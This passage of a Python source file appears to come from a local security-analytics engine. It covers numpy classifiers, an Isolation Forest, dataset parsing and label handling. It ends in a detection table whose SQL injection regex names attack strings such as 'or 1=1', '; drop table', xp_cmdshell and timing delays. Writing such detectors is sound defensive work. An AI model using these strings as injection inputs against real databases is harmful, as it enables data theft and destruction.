"""
CRYPTOSEC AI  ·  Security Intelligence Engine  v6.0
===================================================
The AI half of CryptoSec v6.  Pure Python + numpy (no scikit-learn, no cloud, no
telemetry).  Every module can run in two modes:

  * RULES MODE   – expert rules / statistics that work with no data at all.
  * LEARNED MODE – you upload a dataset (CSV / TSV / JSON / JSONL / log file); the
                   module trains a model on YOUR data (softmax regression on hashed
                   text + numeric + categorical features, or an Isolation Forest when
                   there is no label column) and blends it with the rules.

Modules (19):  malware · phishing · intrusion (IDS/IPS) · uba · response (SOAR) ·
vulnerability · network · spam · iam · risk · logs · anomaly · fraud · intel ·
password · dlp · alerts · predict · monitor

Everything is wired together by `AIHub`:  events → detectors → alerts → incident
response → signed blockchain records, with the same hub serving the desktop app
and the local REST API (`ApiServer`).

Honest limits: the bundled demo datasets are SYNTHETIC; models are only as good as
the data you upload; nothing here replaces a SOC, an EDR or a patch-management
process.  Active response never touches your OS firewall or accounts – it produces
reviewable commands and maintains an in-app blocklist / lock list.
"""
from __future__ import annotations

import base64
import collections
import csv
import datetime
import hashlib
import hmac
import io
import ipaddress
import json
import math
import os
import queue
import re
import secrets
import socket
import struct
import tempfile
import threading
import time
import urllib.parse
import urllib.request
import zlib
from concurrent.futures import ThreadPoolExecutor
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import numpy as np

try:                                              # PostgreSQL storage (optional companion module)
    import cryptosec_pg as cpg
except Exception:                                 # noqa: BLE001
    cpg = None

AI_VERSION = "6.0"
MAX_ROWS = 300_000
MAX_UPLOAD = 256 << 20
UTC = datetime.timezone.utc


# ═══════════════════════════════════════════════════════════════════════
#  SMALL UTILITIES
# ═══════════════════════════════════════════════════════════════════════
def now() -> float:
    return time.time()


def sha256b(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


def sha256s(s: str) -> str:
    return hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()


def clamp(x, lo=0.0, hi=1.0):
    return lo if x < lo else hi if x > hi else x


def noisy_or(ws) -> float:
    p = 1.0
    for w in ws:
        p *= 1.0 - clamp(w)
    return 1.0 - p


def shannon(data) -> float:
    """Shannon entropy in bits/symbol for bytes or str."""
    if not data:
        return 0.0
    if isinstance(data, str):
        data = data.encode("utf-8", "replace")
    c = np.bincount(np.frombuffer(data, np.uint8), minlength=256).astype(float)
    p = c[c > 0] / c.sum()
    return float(-(p * np.log2(p)).sum())


def safe_name(s: str, default="file") -> str:
    s = re.sub(r"[^A-Za-z0-9._-]+", "_", os.path.basename(str(s or ""))).strip("._")
    return (s or default)[:80]


def fnum(v, default=None):
    if v is None or v == "":
        return default
    if isinstance(v, bool):
        return float(v)
    if isinstance(v, (int, float)):
        return float(v) if math.isfinite(v) else default
    try:
        x = float(str(v).strip().replace(",", ""))
        return x if math.isfinite(x) else default
    except ValueError:
        return default


def jdefault(o):
    if isinstance(o, (np.integer,)):
        return int(o)
    if isinstance(o, (np.floating,)):
        return float(o)
    if isinstance(o, np.ndarray):
        return o.tolist()
    if isinstance(o, (set, tuple)):
        return list(o)
    if isinstance(o, bytes):
        return o.hex()
    return str(o)


def dumps(o, **kw) -> str:
    return json.dumps(o, default=jdefault, **kw)


SEVERITIES = ((90, "critical"), (75, "high"), (50, "medium"), (25, "low"), (0, "info"))
SEV_RANK = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}


def sev_of(score: float) -> str:
    for t, n in SEVERITIES:
        if score >= t:
            return n
    return "info"


_TS_FORMATS = ("%d/%b/%Y:%H:%M:%S %z", "%Y-%m-%d %H:%M:%S", "%Y/%m/%d %H:%M:%S", "%m/%d/%Y %H:%M:%S",
               "%m/%d/%Y %H:%M", "%d/%m/%Y %H:%M:%S", "%d/%m/%Y %H:%M", "%Y-%m-%d", "%b %d %H:%M:%S",
               "%b %d %Y %H:%M:%S", "%a %b %d %H:%M:%S %Y")


def parse_ts(v):
    """Epoch seconds from epoch (s/ms/us/ns) or the common date formats; None if not a time."""
    if v is None or v == "":
        return None
    x = fnum(v) if not isinstance(v, str) or re.fullmatch(r"\s*-?\d+(\.\d+)?\s*", v) else None
    if x is not None:
        for lim, div in ((1e17, 1e9), (1e14, 1e6), (1e11, 1e3)):
            if x > lim:
                x /= div
                break
        return x if 3e8 < x < 4.2e9 else None
    s = str(v).strip()
    try:
        dt = datetime.datetime.fromisoformat(s.replace("Z", "+00:00"))
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=UTC)
        return dt.timestamp()
    except ValueError:
        pass
    for fmt in _TS_FORMATS:
        try:
            dt = datetime.datetime.strptime(s, fmt)
            if "%Y" not in fmt and "%y" not in fmt:
                dt = dt.replace(year=datetime.datetime.now(UTC).year)
            if dt.tzinfo is None:
                dt = dt.replace(tzinfo=UTC)
            return dt.timestamp()
        except ValueError:
            continue
    return None


def hour_dow(ts: float) -> tuple[int, int]:
    d = datetime.datetime.fromtimestamp(ts, UTC)
    return d.hour, d.weekday()


def haversine_km(a, b, c, d) -> float:
    r = 6371.0
    p1, p2 = math.radians(a), math.radians(c)
    dp, dl = p2 - p1, math.radians(d - b)
    h = math.sin(dp / 2) ** 2 + math.cos(p1) * math.cos(p2) * math.sin(dl / 2) ** 2
    return 2 * r * math.asin(math.sqrt(h))


def is_private_ip(s: str) -> bool:
    try:
        ip = ipaddress.ip_address(s)
        return ip.is_private or ip.is_loopback or ip.is_link_local
    except ValueError:
        return False


def is_ip(s) -> bool:
    try:
        ipaddress.ip_address(str(s))
        return True
    except ValueError:
        return False


def defang(s: str) -> str:
    return s.replace("http", "hxxp").replace(".", "[.]")


# ═══════════════════════════════════════════════════════════════════════
#  FINDINGS
# ═══════════════════════════════════════════════════════════════════════
def make_finding(module: str, subject: str, score: float, reasons: list, evidence: dict | None = None,
                 mitre: list | None = None, verdict: str | None = None, entity: str | None = None,
                 ts: float | None = None) -> dict:
    score = int(round(clamp(score, 0, 100)))
    ts = ts if ts is not None else now()
    sev = sev_of(score)
    fid = sha256s(f"{module}|{subject}|{'|'.join(map(str, reasons[:3]))}|{int(ts // 60)}")[:16]
    return {"id": fid, "ts": ts, "module": module, "subject": str(subject)[:300], "entity": entity or "",
            "score": score, "severity": sev,
            "verdict": verdict or ("malicious" if score >= 75 else "suspicious" if score >= 50 else
                                   "low-risk" if score >= 25 else "benign"),
            "reasons": [str(r) for r in reasons][:12], "evidence": evidence or {}, "mitre": (mitre or []) if score >= 25 else []}


# ═══════════════════════════════════════════════════════════════════════
#  ML PRIMITIVES  (numpy only)
# ═══════════════════════════════════════════════════════════════════════
class HashVec:
    """Hashed TF-IDF over word tokens + character trigrams (works for URLs, mails, logs)."""

    def __init__(self, dim: int = 384):
        self.dim = dim
        self.idf = np.ones(dim, np.float32)

    @staticmethod
    def tokens(t: str) -> list:
        t = t.lower()[:1500]
        toks = ["w:" + w for w in re.findall(r"[a-z0-9_$]{2,}", t)[:300]]
        cs = re.sub(r"\s+", " ", t[:500])
        toks += ["c:" + cs[i:i + 3] for i in range(max(0, len(cs) - 2))]
        return toks

    def counts(self, t: str) -> np.ndarray:
        v = np.zeros(self.dim, np.float32)
        for g in self.tokens(t):
            v[zlib.crc32(g.encode("utf-8", "replace")) % self.dim] += 1
        return v

    def fit(self, texts):
        df = np.zeros(self.dim, np.float32)
        for t in texts:
            df += (self.counts(t) > 0)
        n = max(1, len(texts))
        self.idf = (np.log((1 + n) / (1 + df)) + 1).astype(np.float32)

    def transform(self, t: str) -> np.ndarray:
        v = np.log1p(self.counts(t)) * self.idf
        n = float(np.linalg.norm(v))
        return v / n if n else v

    def to_dict(self):
        return {"dim": self.dim, "idf": self.idf.tolist()}

    @classmethod
    def from_dict(cls, d):
        h = cls(d["dim"])
        h.idf = np.array(d["idf"], np.float32)
        return h


class Softmax:
    """Multinomial logistic regression, Adam, L2, class-balanced weights."""

    def __init__(self, l2=1e-4, epochs=300, lr=0.15):
        self.l2, self.epochs, self.lr = l2, epochs, lr
        self.W = self.b = None

    def fit(self, X, y, K=None):
        n, d = X.shape
        K = max(2, K or int(y.max()) + 1)
        cnt = np.bincount(y, minlength=K).astype(float)
        cw = np.minimum(np.where(cnt > 0, n / (K * np.maximum(cnt, 1)), 0), 25.0)
        sw = cw[y].astype(np.float32)
        Y = np.eye(K, dtype=np.float32)[y]
        W = np.zeros((d, K), np.float32)
        b = np.zeros(K, np.float32)
        m = [np.zeros_like(W), np.zeros_like(b)]
        v = [np.zeros_like(W), np.zeros_like(b)]
        b1, b2 = 0.9, 0.999
        for t in range(1, self.epochs + 1):
            z = X @ W + b
            z -= z.max(1, keepdims=True)
            P = np.exp(z)
            P /= P.sum(1, keepdims=True)
            G = (P - Y) * sw[:, None] / n
            g = [X.T @ G + self.l2 * W, G.sum(0)]
            for i, (p, gi) in enumerate(((W, g[0]), (b, g[1]))):
                m[i] = b1 * m[i] + (1 - b1) * gi
                v[i] = b2 * v[i] + (1 - b2) * gi * gi
                p -= self.lr * (m[i] / (1 - b1 ** t)) / (np.sqrt(v[i] / (1 - b2 ** t)) + 1e-8)
        self.W, self.b = W, b
        return self

    def proba(self, X):
        z = X @ self.W + self.b
        z = z - z.max(1, keepdims=True)
        P = np.exp(z)
        return P / P.sum(1, keepdims=True)

    def to_dict(self):
        return {"W": self.W.tolist(), "b": self.b.tolist()}

    @classmethod
    def from_dict(cls, d):
        s = cls()
        s.W, s.b = np.array(d["W"], np.float32), np.array(d["b"], np.float32)
        return s


def _c_factor(n: int) -> float:
    if n <= 1:
        return 0.0
    if n == 2:
        return 1.0
    return 2.0 * (math.log(n - 1) + 0.5772156649) - 2.0 * (n - 1) / n


class IsoForest:
    """Isolation Forest (Liu et al.).  Scores ~0.5 = normal, → 1 = anomalous."""

    def __init__(self, n=100, sample=256, seed=7):
        self.n, self.sample, self.seed = n, sample, seed
        self.trees: list = []
        self.psi = 2

    def fit(self, X):
        rng = np.random.default_rng(self.seed)
        n = len(X)
        self.psi = max(2, min(self.sample, n))
        hl = int(math.ceil(math.log2(self.psi)))
        self.trees = []
        for _ in range(self.n):
            idx = rng.choice(n, self.psi, replace=self.psi > n)
            self.trees.append(self._grow(X[idx], hl, rng))
        return self

    @staticmethod
    def _grow(X, hl, rng):
        feat, thr, L, R, size = [], [], [], [], []

        def build(D, depth):
            i = len(feat)
            feat.append(-1); thr.append(0.0); L.append(-1); R.append(-1); size.append(len(D))
            if depth >= hl or len(D) <= 1:
                return i
            lo, hi = D.min(0), D.max(0)
            cand = np.where(hi > lo)[0]
            if not len(cand):
                return i
            f = int(rng.choice(cand))
            t = float(rng.uniform(lo[f], hi[f]))
            m = D[:, f] < t
            feat[i], thr[i] = f, t
            L[i] = build(D[m], depth + 1)
            R[i] = build(D[~m], depth + 1)
            return i

        build(X, 0)
        return (np.array(feat), np.array(thr), np.array(L), np.array(R), np.array(size))

    def score(self, X):
        m = len(X)
        if not self.trees or m == 0:
            return np.full(m, 0.5)
        cv = np.array([_c_factor(i) for i in range(self.psi + 1)])
        tot = np.zeros(m)
        ar = np.arange(m)
        for feat, thr, L, R, size in self.trees:
            cur = np.zeros(m, int)
            depth = np.zeros(m)
            for _ in range(64):
                f = feat[cur]
                act = f >= 0
                if not act.any():
                    break
                xv = X[ar, np.where(act, f, 0)]
                nxt = np.where(xv < thr[cur], L[cur], R[cur])
                cur = np.where(act, nxt, cur)
                depth += act
            tot += depth + cv[np.minimum(size[cur], self.psi)]
        return 2 ** (-(tot / len(self.trees)) / max(_c_factor(self.psi), 1e-9))

    def to_dict(self):
        return {"n": self.n, "sample": self.sample, "psi": self.psi,
                "trees": [[a.tolist() for a in t] for t in self.trees]}

    @classmethod
    def from_dict(cls, d):
        f = cls(d["n"], d["sample"])
        f.psi = d["psi"]
        f.trees = [(np.array(t[0]), np.array(t[1]), np.array(t[2]), np.array(t[3]), np.array(t[4]))
                   for t in d["trees"]]
        return f


def auc_score(y, s) -> float:
    y, s = np.asarray(y), np.asarray(s)
    pos, neg = s[y == 1], s[y == 0]
    if not len(pos) or not len(neg):
        return float("nan")
    order = np.argsort(np.concatenate([pos, neg]), kind="mergesort")
    ranks = np.empty(len(order))
    ranks[order] = np.arange(1, len(order) + 1)
    return float((ranks[:len(pos)].sum() - len(pos) * (len(pos) + 1) / 2) / (len(pos) * len(neg)))


def robust_stats(X):
    med = np.median(X, 0)
    mad = np.median(np.abs(X - med), 0) * 1.4826
    sd = X.std(0)
    mad = np.where(mad < 1e-9, np.where(sd < 1e-9, 1.0, sd), mad)
    return med, mad


# ═══════════════════════════════════════════════════════════════════════
#  DATASETS
# ═══════════════════════════════════════════════════════════════════════
def nk(k) -> str:
    return re.sub(r"[^a-z0-9]+", "_", str(k).strip().lower()).strip("_") or "col"


class Table:
    """A loaded dataset: list of dict rows with normalised (snake_case) column names."""

    def __init__(self, rows, name="", sha="", fmt=""):
        self.rows, self.name, self.sha, self.fmt = rows, name, sha, fmt
        cols: dict = {}
        for r in rows[:200]:
            for k in r:
                cols.setdefault(k, None)
        self.columns = list(cols)

    def __len__(self):
        return len(self.rows)

    def meta(self) -> dict:
        return {"name": self.name, "rows": len(self.rows), "columns": self.columns[:60], "sha256": self.sha,
                "format": self.fmt}


def _rows_from_json(obj):
    if isinstance(obj, list):
        return [r if isinstance(r, dict) else {"value": r} for r in obj]
    if isinstance(obj, dict):
        for k in ("records", "data", "rows", "items", "events", "alerts", "logs", "results"):
            if isinstance(obj.get(k), list):
                return _rows_from_json(obj[k])
        vals = list(obj.values())
        if vals and all(isinstance(v, list) for v in vals):
            n = max(len(v) for v in vals)
            return [{k: (v[i] if i < len(v) else None) for k, v in obj.items()} for i in range(n)]
        return [obj]
    return []


def load_table(data: bytes, name: str = "data") -> Table:
    if len(data) > MAX_UPLOAD:
        raise ValueError("dataset too large")
    sha = sha256b(data)
    text = None
    for enc in ("utf-8-sig", "utf-16", "latin-1"):
        try:
            text = data.decode(enc)
            break
        except (UnicodeDecodeError, UnicodeError):
            continue
    text = text or ""
    ext = os.path.splitext(name.lower())[1]
    head = text.lstrip()[:1]
    rows, fmt = [], "csv"
    if ext in (".jsonl", ".ndjson") or (ext not in (".json", ".csv", ".tsv") and head == "{" and "\n{" in text[:5000]):
        fmt = "jsonl"
        for ln in text.splitlines():
            ln = ln.strip()
            if ln:
                try:
                    o = json.loads(ln)
                    rows.append(o if isinstance(o, dict) else {"value": o})
                except ValueError:
                    rows.append({"line": ln})
            if len(rows) >= MAX_ROWS:
                break
    elif ext == ".json" or head in "[{":
        try:
            rows, fmt = _rows_from_json(json.loads(text)), "json"
        except ValueError:
            rows = []
    if not rows:
        lines = [ln for ln in text.splitlines() if ln.strip()]
        sample = "\n".join(lines[:30])
        delim = None
        if ext in (".csv", ".tsv") or (lines and (lines[0].count(",") >= 1 or lines[0].count("\t") >= 1
                                                   or lines[0].count(";") >= 2 or lines[0].count("|") >= 2)):
            try:
                delim = csv.Sniffer().sniff(sample, delimiters=",;\t|").delimiter
            except csv.Error:
                delim = "\t" if ext == ".tsv" else ","
        if delim and len(lines) >= 2 and ext not in (".log",):
            rd = csv.reader(io.StringIO("\n".join(lines)), delimiter=delim)
            hdr = [nk(h) for h in next(rd)]
            seen: dict = {}
            for i, h in enumerate(hdr):
                if h in seen:
                    seen[h] += 1
                    hdr[i] = f"{h}_{seen[h]}"
                else:
                    seen[h] = 0
            for rec in rd:
                if len(rec) < 2 and len(hdr) > 1:
                    continue
                rows.append(dict(zip(hdr, rec)))
                if len(rows) >= MAX_ROWS:
                    break
            fmt = "csv"
        else:
            rows, fmt = [{"line": ln} for ln in lines[:MAX_ROWS]], "log"
    rows = [{nk(k): v for k, v in r.items()} if isinstance(r, dict) else {"value": r} for r in rows]
    return Table(rows, name, sha, fmt)


LABEL_HINTS = ("label", "class", "target", "attack_cat", "attack", "is_malicious", "malicious", "is_fraud",
               "isfraud", "fraud", "is_spam", "spam", "is_phishing", "phishing", "category", "verdict",
               "result", "outcome", "type", "y", "anomaly", "is_anomaly", "severity", "priority")
POS_TOK = {"1", "true", "yes", "y", "malicious", "attack", "spam", "phishing", "phish", "fraud", "fraudulent",
           "bad", "anomaly", "anomalous", "malware", "abnormal", "threat", "suspicious", "defacement"}
NEG_TOK = {"0", "false", "no", "n", "benign", "normal", "ham", "legit", "legitimate", "good", "safe", "clean",
           "not_fraud", "regular", "-1.0", "0.0"}
BENIGN_NAMES = ("benign", "normal", "ham", "legit", "legitimate", "clean", "safe", "none", "good", "ok",
                "not_fraud", "false", "0")


def detect_label(rows, hint=None):
    """Return the label column name or None."""
    if not rows:
        return None
    cols = list(rows[0].keys())
    order = ([nk(hint)] if hint else []) + [h for h in LABEL_HINTS if h in cols]
    for c in order:
        if c not in cols:
            continue
        vals = {str(r.get(c, "")).strip().lower() for r in rows[:5000] if r.get(c) not in (None, "")}
        if 2 <= len(vals) <= 25:
            return c
    return None


def norm_labels(raw):
    """Normalise label strings.  Binary sets are mapped to benign/malicious."""
    low = [str(v).strip().lower() for v in raw]
    vals = set(low)
    if vals <= (POS_TOK | NEG_TOK) and len(vals) == 2 and vals & POS_TOK and vals & NEG_TOK:
        return ["malicious" if v in POS_TOK else "benign" for v in low]
    if len(vals) == 2 and not (vals & POS_TOK):          # unknown 2-class: rarer class = malicious
        cnt = collections.Counter(low)
        minority = cnt.most_common()[-1][0]
        return ["malicious" if v == minority else "benign" for v in low]
    return low


# ═══════════════════════════════════════════════════════════════════════
#  FEATURE SPACE + LEARNED MODEL
# ═══════════════════════════════════════════════════════════════════════
TEXT_SCALE = 6.0
TIME_RE = re.compile(r"(^|_)(time|date|ts|timestamp|datetime|created|logged|when)(_|$)")
ID_RE = re.compile(r"(^|_)(id|uuid|guid|index|idx|seq|row)(_|$)")
IPV4_RE = re.compile(r"^\d{1,3}(\.\d{1,3}){3}$")


class FeatureSpace:
    def __init__(self, text_dim=384, extra_fn=None, max_cat=10):
        self.text_dim, self.extra_fn, self.max_cat = text_dim, extra_fn, max_cat
        self.cols: list = []
        self.ext: list = []
        self.tcols: list = []
        self.tv = HashVec(text_dim)
        self.names: list = []

    def fit(self, rows, exclude=()):
        sample = rows[:5000]
        keys: dict = {}
        for r in sample:
            for k in r:
                keys.setdefault(k, None)
        self.cols, self.tcols, self.ext = [], [], []
        for k in keys:
            if k in exclude:
                continue
            vals = [r.get(k) for r in sample if r.get(k) not in (None, "")]
            if len(vals) < max(3, 0.05 * len(sample)):
                continue
            if TIME_RE.search(k) and sum(parse_ts(v) is not None for v in vals[:200]) >= 0.8 * min(200, len(vals)):
                self.cols.append({"kind": "time", "name": k})
                continue
            nums = [fnum(v) for v in vals]
            if sum(x is not None for x in nums) >= 0.9 * len(vals):
                a = np.array([x for x in nums if x is not None], float)
                if ID_RE.search(k) and len(np.unique(a)) == len(a):
                    continue
                lg = bool(a.min() >= 0 and a.max() > 50 * max(float(np.median(a)), 1e-9) and a.max() > 100)
                t = np.log1p(a) if lg else a
                self.cols.append({"kind": "num", "name": k, "log": lg, "mu": float(t.mean()),
                                  "sd": float(t.std()) or 1.0})
                continue
            sv = [str(v) for v in vals]
            avg = sum(map(len, sv)) / len(sv)
            uniq = len(set(sv))
            if sum(bool(IPV4_RE.match(v)) for v in sv[:200]) > 0.8 * min(200, len(sv)) and uniq > 60:
                continue
            if avg >= 20 or (uniq > 0.5 * len(sv) and avg >= 10):
                self.tcols.append(k)
            elif uniq <= 60:
                self.cols.append({"kind": "cat", "name": k,
                                  "top": [v for v, _ in collections.Counter(sv).most_common(self.max_cat)]})
            elif avg >= 6:
                self.tcols.append(k)
        if self.extra_fn:
            exs = [self.extra_fn(r) for r in sample[:1500]]
            for k in exs[0]:
                a = np.array([e.get(k, 0.0) for e in exs], float)
                self.ext.append({"name": k, "mu": float(a.mean()), "sd": float(a.std()) or 1.0})
        if self.tcols:
            self.tv.fit([self._text(r) for r in sample[:3000]])
        self.names = []
        for c in self.cols:
            if c["kind"] == "num":
                self.names.append(c["name"])
            elif c["kind"] == "time":
                self.names += [f"{c['name']}:hour_sin", f"{c['name']}:hour_cos", f"{c['name']}:dow_sin",
                               f"{c['name']}:dow_cos"]
            else:
                self.names += [f"{c['name']}={t}" for t in c["top"]] + [f"{c['name']}=other"]
        self.names += [e["name"] for e in self.ext]
        self.n_dense = len(self.names)
        return self

    def _text(self, r) -> str:
        return " \n ".join(str(r.get(c, "")) for c in self.tcols)

    def vec(self, r) -> np.ndarray:
        out = []
        for c in self.cols:
            v = r.get(c["name"])
            if c["kind"] == "num":
                x = fnum(v)
                if x is None:
                    out.append(0.0)
                else:
                    if c["log"]:
                        x = math.log1p(max(x, 0.0))
                    out.append(clamp((x - c["mu"]) / c["sd"], -6, 6))
            elif c["kind"] == "time":
                ts = parse_ts(v)
                if ts is None:
                    out += [0.0] * 4
                else:
                    h, d = hour_dow(ts)
                    out += [math.sin(2 * math.pi * h / 24), math.cos(2 * math.pi * h / 24),
                            math.sin(2 * math.pi * d / 7), math.cos(2 * math.pi * d / 7)]
            else:
                s = str(v) if v not in (None, "") else None
                oh = [1.0 if s == t else 0.0 for t in c["top"]]
                out += oh + [1.0 if s is not None and not any(oh) else 0.0]
        if self.ext:
            ex = self.extra_fn(r)
            out += [clamp((ex.get(e["name"], 0.0) - e["mu"]) / e["sd"], -6, 6) for e in self.ext]
        dense = np.array(out, np.float32)
        if self.tcols:
            return np.concatenate([dense, self.tv.transform(self._text(r)) * TEXT_SCALE])
        return dense

    def matrix(self, rows) -> np.ndarray:
        if not rows:
            return np.zeros((0, self.n_dense + (self.text_dim if self.tcols else 0)), np.float32)
        return np.vstack([self.vec(r) for r in rows])

    def to_dict(self):
        return {"text_dim": self.text_dim, "max_cat": self.max_cat, "cols": self.cols, "ext": self.ext,
                "tcols": self.tcols, "tv": self.tv.to_dict(), "names": self.names, "n_dense": self.n_dense}

    @classmethod
    def from_dict(cls, d, extra_fn=None):
        f = cls(d["text_dim"], extra_fn, d["max_cat"])
        f.cols, f.ext, f.tcols, f.names, f.n_dense = d["cols"], d["ext"], d["tcols"], d["names"], d["n_dense"]
        f.tv = HashVec.from_dict(d["tv"])
        return f


class LearnedModel:
    """Either a supervised softmax classifier or an unsupervised Isolation Forest."""

    def __init__(self, extra_fn=None):
        self.extra_fn = extra_fn
        self.kind = None
        self.fs: FeatureSpace | None = None
        self.clf: Softmax | None = None
        self.iso: IsoForest | None = None
        self.classes: list = []
        self.benign = None
        self.thr = 0.5
        self.metrics: dict = {}
        self.label_col = None
        self.med = self.mad = None

    # -- training -------------------------------------------------------
    def fit_supervised(self, rows, label_col, max_rows=20000, seed=11):
        rng = np.random.default_rng(seed)
        rows = [r for r in rows if r.get(label_col) not in (None, "")]
        labels = norm_labels([r[label_col] for r in rows])
        if len(rows) > max_rows:
            idx = rng.choice(len(rows), max_rows, replace=False)
            rows, labels = [rows[i] for i in idx], [labels[i] for i in idx]
        if len(set(labels)) < 2:
            raise ValueError("The label column has only one class — need at least two to learn.")
        self.classes = sorted(set(labels))
        y = np.array([self.classes.index(v) for v in labels])
        self.benign = next((c for c in BENIGN_NAMES if c in self.classes), None)
        self.label_col = label_col
        perm = rng.permutation(len(rows))
        nv = max(1, int(0.2 * len(rows))) if len(rows) >= 20 else 0
        va, tr = perm[:nv], perm[nv:]
        excl = (label_col,)
        self.fs = FeatureSpace(extra_fn=self.extra_fn).fit([rows[i] for i in tr], excl)
        X = self.fs.matrix(rows)
        K = len(self.classes)
        self.clf = Softmax().fit(X[tr], y[tr], K)
        if nv:
            P = self.clf.proba(X[va])
            pred = P.argmax(1)
            yv = y[va]
            m = {"accuracy": float((pred == yv).mean()), "n_train": int(len(tr)), "n_val": int(nv)}
            cm = np.zeros((K, K), int)
            for a, b in zip(yv, pred):
                cm[a, b] += 1
            m["confusion"] = cm.tolist()
            per = {}
            for k, c in enumerate(self.classes):
                tp, fp, fn = cm[k, k], cm[:, k].sum() - cm[k, k], cm[k, :].sum() - cm[k, k]
                pr = tp / (tp + fp) if tp + fp else 0.0
                rc = tp / (tp + fn) if tp + fn else 0.0
                per[c] = {"precision": round(float(pr), 4), "recall": round(float(rc), 4),
                          "f1": round(float(2 * pr * rc / (pr + rc)) if pr + rc else 0.0, 4),
                          "support": int(cm[k, :].sum())}
            m["per_class"] = per
            m["macro_f1"] = round(float(np.mean([v["f1"] for v in per.values()])), 4)
            if K == 2 and "malicious" in self.classes:
                pi = self.classes.index("malicious")
                sc = P[:, pi]
                m["auc"] = round(auc_score((yv == pi).astype(int), sc), 4)
                best, bt = -1.0, 0.5
                for t in np.linspace(0.2, 0.8, 25):
                    p = sc >= t
                    tp = int((p & (yv == pi)).sum())
                    fp = int((p & (yv != pi)).sum())
                    fn = int((~p & (yv == pi)).sum())
                    f1 = 2 * tp / (2 * tp + fp + fn) if tp + fp + fn else 0
                    if f1 > best:
                        best, bt = f1, float(t)
                self.thr = bt
            self.metrics = m
        else:
            self.metrics = {"note": "too few rows for a validation split", "n_train": int(len(tr))}
        self.clf = Softmax().fit(X, y, K)                    # refit on all data
        self.kind = "supervised"
        return self.metrics

    def fit_anomaly(self, rows, contamination=0.02, max_rows=20000, seed=11):
        rng = np.random.default_rng(seed)
        if len(rows) > max_rows:
            rows = [rows[i] for i in rng.choice(len(rows), max_rows, replace=False)]
        self.fs = FeatureSpace(extra_fn=self.extra_fn).fit(rows)
        X = self.fs.matrix(rows)
        if X.shape[1] == 0:
            raise ValueError("No usable numeric / categorical / text columns were found in this dataset.")
        self.iso = IsoForest(seed=seed).fit(X)
        s = self.iso.score(X)
        self.thr = float(np.quantile(s, 1 - contamination))
        self.s_lo = float(np.median(s))
        self.med, self.mad = robust_stats(X[:, :self.fs.n_dense]) if self.fs.n_dense else (None, None)
        self.kind = "anomaly"
        self.metrics = {"rows": len(rows), "features": int(X.shape[1]), "contamination": contamination,
                        "threshold": round(self.thr, 4)}
        return self.metrics

    # -- inference ------------------------------------------------------
    def score_rows(self, rows) -> list:
        if not rows or self.kind is None:
            return []
        X = self.fs.matrix(rows)
        out = []
        if self.kind == "supervised":
            P = self.clf.proba(X)
            for p in P:
                k = int(p.argmax())
                if "malicious" in self.classes and len(self.classes) == 2:
                    s = float(p[self.classes.index("malicious")])
                    s = clamp(0.5 * s / self.thr) if s < self.thr else clamp(0.5 + 0.5 * (s - self.thr) / (1 - self.thr))
                    lab = "malicious" if s >= 0.5 else "benign"
                elif self.benign in self.classes:
                    s = float(1 - p[self.classes.index(self.benign)])
                    lab = self.classes[k]
                else:
                    s, lab = float(p.max()), self.classes[k]
                out.append({"score": s, "label": lab, "probs": {c: round(float(p[i]), 4)
                                                                for i, c in enumerate(self.classes)}})
        else:
            sc = self.iso.score(X)
            for i, v in enumerate(sc):
                s = clamp((v - self.s_lo) / max(self.thr - self.s_lo, 1e-6) * 0.5) if v < self.thr else \
                    clamp(0.5 + 0.5 * (v - self.thr) / max(0.95 - self.thr, 1e-6))
                ex = []
                if self.med is not None:
                    z = np.abs((X[i, :self.fs.n_dense] - self.med) / self.mad)
                    for j in np.argsort(-z)[:3]:
                        if z[j] > 2.5:
                            ex.append((self.fs.names[j], round(float(z[j]), 1)))
                out.append({"score": float(s), "label": "anomalous" if s >= 0.5 else "normal",
                            "raw": round(float(v), 4), "top_features": ex})
        return out

    def score_row(self, row):
        r = self.score_rows([row])
        return r[0] if r else None

    def explain_tokens(self, row, topn=5) -> list:
        """Which words pushed a supervised text model towards 'malicious'?"""
        if self.kind != "supervised" or not self.fs.tcols or "malicious" not in self.classes:
            return []
        pi = self.classes.index("malicious")
        ni = 1 - pi if len(self.classes) == 2 else 0
        off = self.fs.n_dense
        w = self.clf.W[:, pi] - self.clf.W[:, ni]
        seen: dict = {}
        for tok in set(re.findall(r"[a-z0-9_$]{2,}", self.fs._text(row).lower()[:1500])):
            h = zlib.crc32(("w:" + tok).encode()) % self.fs.text_dim
            seen[tok] = float(w[off + h] * self.fs.tv.idf[h])
        return [t for t, v in sorted(seen.items(), key=lambda kv: -kv[1])[:topn] if v > 0]

    # -- persistence ----------------------------------------------------
    def to_dict(self):
        d = {"kind": self.kind, "classes": self.classes, "benign": self.benign, "thr": self.thr,
             "metrics": self.metrics, "label_col": self.label_col, "fs": self.fs.to_dict()}
        if self.clf:
            d["clf"] = self.clf.to_dict()
        if self.iso:
            d["iso"] = self.iso.to_dict()
            d["s_lo"] = getattr(self, "s_lo", 0.4)
            d["med"] = None if self.med is None else self.med.tolist()
            d["mad"] = None if self.mad is None else self.mad.tolist()
        return d

    @classmethod
    def from_dict(cls, d, extra_fn=None):
        m = cls(extra_fn)
        m.kind, m.classes, m.benign, m.thr = d["kind"], d["classes"], d["benign"], d["thr"]
        m.metrics, m.label_col = d["metrics"], d["label_col"]
        m.fs = FeatureSpace.from_dict(d["fs"], extra_fn)
        if "clf" in d:
            m.clf = Softmax.from_dict(d["clf"])
        if "iso" in d:
            m.iso = IsoForest.from_dict(d["iso"])
            m.s_lo = d.get("s_lo", 0.4)
            m.med = None if d.get("med") is None else np.array(d["med"])
            m.mad = None if d.get("mad") is None else np.array(d["mad"])
        return m


# ═══════════════════════════════════════════════════════════════════════
#  SHARED SECURITY KNOWLEDGE
# ═══════════════════════════════════════════════════════════════════════
SIGNATURES = {   # name: (regex, base weight 0-1, MITRE ATT&CK technique)
    "SQL injection": (re.compile(r"(?i)(union(\s|\+|%20|/\*.*?\*/)+(all(\s|\+|%20)+)?select|\bor\b(\s|\+|%20)+['\"]?1['\"]?(\s|\+|%20)*=(\s|\+|%20)*['\"]?1|'\s*or\s*'[^']*'\s*=\s*'|sleep\(\d+\)|benchmark\(\d+|information_schema|;\s*drop\s+table|xp_cmdshell|waitfor\s+delay)"), .85, "T1190"),
